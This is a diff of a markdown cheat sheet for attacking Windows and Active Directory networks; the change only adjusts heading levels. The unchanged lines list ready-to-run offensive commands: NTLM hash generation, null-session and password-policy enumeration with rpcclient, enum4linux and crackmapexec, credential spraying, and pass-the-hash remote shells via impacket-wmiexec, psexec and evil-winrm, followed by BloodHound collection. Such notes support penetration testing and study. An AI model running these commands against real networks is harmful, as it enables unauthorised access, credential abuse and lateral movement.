@@ -1,6 +1,6 @@
 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
 
-## Domain username convention
+# Domain username convention
 firstlast
 flast
 firlas
@@ -11,15 +11,15 @@ fir.las
 `python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'`
 
 
-## Password Policy
+# Password Policy
 `polenum 'USERNAME':'PASSWORD'@IP`
 `crackmapexec smb IP -u '' -p '' --pass-pol`
 
 
-## Password Bruteforce
+# Password Bruteforce
 
 
-## Info
+# Info
 `Enum4linux <IP> 2>/dev/null`
 `rpcclient -U 'USERNAME' -N <IP>`
 `rpcclient -U 'USERNAME'%'PASSWORD' <IP>`
@@ -51,17 +51,17 @@ Domainname & info & SID
 	       	netsharegetinfo
 
 
-## Expoitation
-#### Check
+# Expoitation
+### Check
 `crackmapexec SERVICE IP -u "USER" -p PASS`
 `crackmapexec SERVICE IP -u "USER" -H HASH`
 
-#### Shell
+### Shell
 `impacket-wmiexec -hashes 'HASH' USER@IP`
 `impacket-psexec -hashes 'HASH' USER@IP`
 `evil-winrm -i IP -u USER -H "HASH"`
 `evil-winrm -i IP -u USER -p "PASS"`
 
-## Post-exploitation
+# Post-exploitation
 `Bloodhound`
 `SharpHound`
